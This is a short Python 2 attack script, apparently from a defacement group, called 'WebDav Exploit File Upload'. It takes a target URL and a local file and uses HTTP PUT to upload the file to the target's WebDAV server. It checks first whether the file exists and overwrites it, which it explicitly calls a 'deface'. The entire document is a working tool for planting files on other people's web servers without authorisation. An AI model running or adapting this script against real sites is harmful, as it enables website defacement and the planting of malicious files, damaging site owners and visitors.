#python 2.7.6

import requests
import string
import random
import sys
import os

os.system("clear")

print """
 __      __      ___.   ________      _________   ____
/  \    /  \ ____\_ |__ \______ \    /  _  \   \ /   /
\   \/\/   // __ \| __ \ |    |  \  /  /_\  \   Y   / 
 \        /\  ___/| \_\ \|    `   \/    |    \     /  
  \__/\  /  \___  >___  /_______  /\____|__  /\___/   
       \/       \/    \/        \/         \/ """


b = '\033[34;1m'
d = '\033[31;1m'
p = '\033[33;1m'
h = '\033[32;1m'
s = '\033[0m'

def upload():
  print '\033[34;1m[*]\033[0m Uploading Script : \033[32;1m'+sys.argv[2]
  print '\033[34;1m[*]\033[0m Sending \033[32;1m%d\033[0m bytes, To Target.' % len(put_request)

  r = requests.request('put', host + outname, data=put_request, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print '\033[31;1m[!]\033[0m Upload failed . . .'
    sys.exit(1)
  else:
    print '\033[34;1m[*]\033[0m File uploaded.'
    print '\033[34;1m[*]\033[0m Path : '+sys.argv[1]+'/'+sys.argv[2]+'\033[0m'


if __name__ == '__main__':
  if len(sys.argv) != 3:
  
    print('\nUsage: python2 \033[32;1mwebdav.py\033[0m [URL Target] [Nama File Script]\n')
    sys.exit(0)

  sc = ''
  with open(sys.argv[2], 'rb') as f:
      script = f.read()
  put_request = script

  print("""
\033[34;1m[*]\033[0m WebDav Exploit File Upload
\033[34;1m[*]\033[0m Lawliest!_666 | Member of DARK FORCE ARMY
\033[34;1m[*]\033[0m Thx To DARK FORCE ARMY
""")

  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  outname = '/'+sys.argv[2]

  print '\n\033[34;1m[*]\033[0m Checking Avilable File '
  r = requests.get(host + outname)
  if r.status_code == requests.codes.ok:
    print('\033[34;1m[!]\033[0m File Names [ \033[32;1m'+sys.argv[2]+'\033[0m ] Found On Target.')
    print("\033[33;1m[!]\033[0m Replace File On Target To Script Deface")
    upload()
  else:
    print '\033[34;1m[*]\033[0m File Not Found On Target.'
    upload()
